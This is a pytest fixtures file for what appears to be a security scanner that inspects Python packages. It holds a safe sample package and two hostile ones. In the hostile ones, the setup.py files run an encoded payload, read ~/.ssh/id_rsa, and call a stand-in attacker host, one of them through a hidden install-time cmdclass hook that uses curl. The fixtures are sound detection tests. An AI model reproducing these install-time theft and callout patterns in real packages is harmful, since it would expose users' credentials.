#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Shared fixtures."""

from pathlib import Path

import pytest

GOLDEN_DIR = Path(__file__).parent / "golden"


@pytest.fixture(autouse=True)
def isolate_llm_backend(monkeypatch: pytest.MonkeyPatch) -> None:
    """Force LLM autodetect to find nothing unless a test opts in explicitly.

    Tests that want to exercise a backend can monkeypatch their own env
    or call internal functions directly. Without this, a developer
    running tests on a machine with a live Ollama or ANTHROPIC_API_KEY
    in their shell would get different behaviour than CI.
    """
    monkeypatch.setenv("WTFGUARD_OLLAMA_URL", "http://127.0.0.1:1")
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    monkeypatch.delenv("WTFGUARD_LLM_BACKEND", raising=False)


@pytest.fixture
def golden_dir() -> Path:
    return GOLDEN_DIR


@pytest.fixture
def safe_package(tmp_path: Path) -> Path:
    """A package tree that should produce zero high/critical findings."""
    root = tmp_path / "safe-pkg-1.0.0"
    root.mkdir()
    (root / "setup.py").write_text(
        "from setuptools import setup\n"
        "setup(name='safe-pkg', version='1.0.0', packages=['safe_pkg'])\n",
        encoding="utf-8",
    )
    pkg = root / "safe_pkg"
    pkg.mkdir()
    (pkg / "__init__.py").write_text("__version__ = '1.0.0'\n", encoding="utf-8")
    return root


@pytest.fixture
def malicious_package(tmp_path: Path) -> Path:
    """A package tree that should trigger critical findings."""
    root = tmp_path / "bad-pkg-2.0.0"
    root.mkdir()
    (root / "setup.py").write_text(
        "import base64\n"
        "import os\n"
        "import urllib.request\n"
        "from setuptools import setup\n"
        "\n"
        "PAYLOAD = '"
        + "A" * 600
        + "='\n"
        "exec(base64.b64decode(PAYLOAD))\n"
        "urllib.request.urlopen('http://attacker.example/exfil')\n"
        "with open(os.path.expanduser('~/.ssh/id_rsa')) as fh:\n"
        "    data = fh.read()\n"
        "setup(name='bad-pkg', version='2.0.0', packages=['bad_pkg'])\n",
        encoding="utf-8",
    )
    pkg = root / "bad_pkg"
    pkg.mkdir()
    (pkg / "__init__.py").write_text("\n", encoding="utf-8")
    return root


@pytest.fixture
def cmdclass_package(tmp_path: Path) -> Path:
    """setup.py that hides install-time code in a custom cmdclass."""
    root = tmp_path / "cmd-pkg-1.0.0"
    root.mkdir()
    (root / "setup.py").write_text(
        "import subprocess\n"
        "from setuptools import setup\n"
        "from setuptools.command.install import install\n"
        "\n"
        "class CustomInstall(install):\n"
        "    def run(self):\n"
        "        subprocess.check_call(['curl', 'http://attacker.example/x'])\n"
        "        install.run(self)\n"
        "\n"
        "setup(name='cmd-pkg', version='1.0.0', cmdclass={'install': CustomInstall})\n",
        encoding="utf-8",
    )
    return root
